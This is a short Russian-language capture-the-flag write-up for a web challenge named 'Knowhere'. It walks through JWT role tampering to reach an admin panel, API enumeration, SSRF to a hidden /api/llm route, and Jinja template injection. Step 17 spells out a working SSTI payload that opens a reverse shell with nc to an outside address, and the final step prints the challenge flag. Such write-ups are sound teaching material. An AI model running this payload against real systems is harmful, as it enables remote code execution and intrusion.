# Knowhere

1. Сайт пустой, что грустно
2. Похоже, что у нас есть система входа в админку
3. Регистрируемся, не забывая смотреть за запросами
4. Нам прилетает JWT, в котором находится буквально все что передается в JSON на регистрации
5. А прикольно было бы перезаписать поле user_type, но на что?
6. Смотрим js код фронтенда для регистрации и входа - находим фильтр `user_type==="admin"`
7. Перехватываем запрос в Burp Suite и добавляем в JSON `user_type: "admin"`
8. Мы в смешной админке, куда можно загружать файлы и скачивать по ссылке
9. Подсказок в панели НОЛЬ. Переходим к энумерации всего что есть в /api/ (стандартный словарь dirb сгодится)
10. Находим подозрительный /api/docs, заходим и получаем 403
11. SSRF в помощь!
12. Видим странный роут /api/llm
13. Кидаем запрос на этот роут и получаем ответ, что требуется поле "user"
14. Sorry, USERNAME, our chatbot server is not available.
15. А меня зовут `${{<%[%'\"}}%\\.`
16. Ой, Template injection в Jinja...
17. Мы ошиблись, наше имя шелл, реверс шелл (`{{ self.__init__.__globals__.__builtins__.__import__('os').popen('rm /tmp/fif;mkfifo /tmp/fif;cat /tmp/fif|/bin/bash -i 2>&1|nc 1.1.1.1 7777 >/tmp/fif').read() }}`, ну или бахнуть meterpreter)
18. Получаем шелл
19. А там в корне /flag.txt (`vrnctf{llm_pr4nk_f0r_th3_search1ng_0n3s}`)